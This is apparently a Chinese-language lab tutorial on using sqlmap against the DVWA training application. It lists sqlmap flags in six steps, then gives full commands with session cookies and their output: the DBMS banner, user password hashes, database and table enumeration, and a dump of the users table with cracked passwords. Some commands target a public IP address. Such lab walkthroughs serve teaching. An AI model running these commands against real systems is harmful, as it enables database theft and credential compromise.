### 常用参数
* --cookie: 设置我们的cookie值“将DVWA安全等级从high设置为low”
* -u: 指定目标URL
* -b: 获取DBMS banner
#### 第一步
* --current-db: 获取当前数据库
* --current-user: 获取当前用户
#### 第二步
* --string: 当查询可用时用来匹配页面中的字符串
* --users: 枚举DBMS用户
* --password: 枚举DBMS用户密码hash
#### 第三步
* --dbs: 枚举DBMS中的数据库
#### 第四步
* --D: 要枚举的DBMS数据库
* --tables: 枚举DBMS数据库中的数据表
#### 第五步
* -T: 要枚举的DBMS数据库表
* --columns: 枚举DBMS数据库表中的所有列
#### 第六步 获取密码 密文 & 明文
* -T: 要枚举的DBMS数据表
* -C: 要枚举的DBMS数据表中的列
* --dump: 转储DBMS数据表项
* SQLmap会提问是否破解密码，按回车确认：

### DVWA 对应于上面六步的操作
将dvwa的安全等级设置为低
进入页面的“SQL Injection”部分，输入任意值并提交,得到
```
http://10.10.10.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#
```
#### 使用以下命令来检索当前数据库和当前用户
```
sqlmap.py -u "http://10.10.10.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=57p5g7f32b3ffv8l45qppudqn3;security=low" -b –current-db –current-user
```
DBMS : MySQLversion 5.0
OS versionUbuntu 12.04
current user:root
current db :DVWA
#### 检索DBMS的用户和密码
```
sqlmap -u "http://115.28.247.19/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=3ipov6h2puvu6h13baj3co74n1;security=low" --string="Surname" --users --password
```
databasemanagement system users [142]:
[*] ”@’kingasmk’
[*]”@’localhost’
[*]‘debian-sys-maint’@'localhost’
[*]‘phpmyadmin’@'localhost’
[*]‘root’@’127.0.0.1′
[*] ‘root’@'::1′
[*]‘root’@'kingasmk’
[*]‘root’@'localhost’

[*]debian-sys-maint [1]:
password hash:*C30441E06530498BC86019BF3211B94B3BAB295A
[*] phpmyadmin[1]:
password hash:*C30441E06530498BC86019BF3211B94B3BAB295A
[*] root [4]:
password hash: *C30441E06530498BC86019BF3211B94B3BAB295A
password hash:*C30441E06530498BC86019BF3211B94B3BAB295A
password hash:*C30441E06530498BC86019BF3211B94B3BAB295A
password hash:*C30441E06530498BC86019BF3211B94B3BAB295A
* 利用 john 工具将密码破解出来
#### DBMS中的数据库
```
sqlmap -u "http://115.28.247.19/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=3ipov6h2puvu6h13baj3co74n1;security=low" --string="name" --dbs
```
availabledatabases [5]:
[*]dvwa
[*]information_schema
[*]mysql
[*]performance_schema
[*]phpmyadmin
#### 枚举 DVWA 的数据表
```
sqlmap -u "http://115.28.247.19/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=3ipov6h2puvu6h13baj3co74n1;security=low" --string="name" -D dvwa --tables
```
Database: dvwa
[2 tables]
+———-------—+
| guestbook |
| users     |
+———-------—+
#### 获取用户表的列
```
sqlmap -u "http://115.28.247.19/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=3ipov6h2puvu6h13baj3co74n1;security=low" --string="name" -D dvwa -T users --columns
```
Database: dvwa
Table: users
[8 columns]
+--------------+-------------+
| Column       | Type        |
+--------------+-------------+
| user         | varchar(15) |
| avatar       | varchar(70) |
| failed_login | int(3)      |
| first_name   | varchar(15) |
| last_login   | timestamp   |
| last_name    | varchar(15) |
| password     | varchar(32) |
| user_id      | int(6)      |
+--------------+-------------+
#### 获取感兴趣的列的内容
```
sqlmap -u "http://115.28.247.19/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=3ipov6h2puvu6h13baj3co74n1;security=low" --string="name" -D dvwa -T users -C user,passwd --dump
```
Database: dvwa
Table: users
[5 entries]
+---------+---------------------------------------------+
| user    | password                                    |
+---------+---------------------------------------------+
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+---------+---------------------------------------------+
